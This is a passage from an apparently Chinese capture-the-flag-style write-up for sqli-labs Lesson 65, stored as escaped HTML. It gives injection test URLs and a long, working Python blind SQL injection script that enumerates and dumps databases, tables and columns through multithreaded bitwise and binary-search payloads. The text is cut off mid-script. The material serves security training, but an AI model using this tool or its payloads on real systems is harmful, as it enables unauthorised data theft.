class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求\"><a href=\"#sqli-labs-lession-65-GET-盲注-变化4-仅允许130次请求\" class=\"headerlink\" title=\"sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求\"></a>sqli-labs lession-65 GET-盲注-变化4-仅允许130次请求</h1><hr>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p><code>http://10.60.17.35:8082/Less-65/?id=1&quot;)+and+1=2%23</code></p>\n<p><code>http://10.60.17.35:8082/Less-65/?id=1&quot;)+and+1=1%23</code></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p><img src=\"/img/sql/Lesson-65/001.png\" alt=\"001\"></p>\n<p><img src=\"/img/sql/Lesson-65/002.png\" alt=\"002\"></p>\n<p><img src=\"/img/sql/Lesson-65/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-65/004.png\" alt=\"004\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">'\")'</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT 